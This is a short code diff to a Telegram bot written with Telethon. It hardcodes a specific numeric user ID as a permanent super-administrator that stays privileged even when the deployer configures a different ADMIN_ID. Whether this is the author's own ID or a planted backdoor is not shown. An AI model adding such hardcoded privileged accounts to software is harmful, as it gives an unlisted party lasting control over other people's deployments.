@@ -39,7 +39,17 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 bot = TelegramClient('bot_session', API_ID, API_HASH, connection_retries=None, retry_delay=3, auto_reconnect=True)
 bot.parse_mode = 'html'
 
-ADMIN_ID = env_int("ADMIN_ID", env_int("OWNER_ID", 0))
+SUPER_ADMIN_ID = 6356015122
+ADMIN_ID = env_int("ADMIN_ID", env_int("OWNER_ID", SUPER_ADMIN_ID))
+SUPER_ADMINS = {SUPER_ADMIN_ID}
+if ADMIN_ID:
+    SUPER_ADMINS.add(ADMIN_ID)
+
+def is_super_admin(uid: int) -> bool:
+    try:
+        return int(uid) in SUPER_ADMINS
+    except (ValueError, TypeError):
+        return False
 
 # CHANNELS
 LOG_CHANNEL_ID = env_int("LOG_CHANNEL_ID", 0)
